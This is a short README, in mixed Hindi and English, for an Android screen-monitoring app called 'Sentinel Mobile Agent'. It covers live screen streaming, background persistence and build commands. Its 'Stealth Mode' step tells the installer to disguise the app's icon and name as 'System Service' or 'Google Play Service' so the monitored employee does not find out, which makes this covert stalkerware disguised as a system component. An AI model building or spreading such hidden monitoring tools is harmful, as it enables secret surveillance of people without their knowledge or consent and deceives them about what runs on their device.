# Sentinel Mobile Agent (Android)

Yeh aapka React Native based mobile screen monitoring agent hai.

## Features
- ✅ Live Mobile Screen Streaming (SIM/WiFi par bhi)
- ✅ Ghost Mode UI (Premium Dark Theme)
- ✅ WebRTC End-to-End Encryption
- ✅ Auto-reconnect System

## Setup Instructions

1. **Install Dependencies:**
   ```bash
   npm install react-native-webrtc socket.io-client
   ```

2. **Android Permissions (android/app/src/main/AndroidManifest.xml):**
   Add these lines for screen recording and background service:
   ```xml
   <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
   <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
   ```

3. **Background Persistence:**
   Mobile par app ko hamesha zinda rakhne ke liye hum `react-native-foreground-service` ka use kar sakte hain.

4. **Stealth Mode:**
   App ka icon aur naam phone ki settings mein "System Service" ya "Google Play Service" rakhein taaki employee ko pata na chale.

## How to Build APK?
```bash
cd android
./gradlew assembleRelease
```

Aapka `.apk` file `android/app/build/outputs/apk/release/` mein mil jayega.
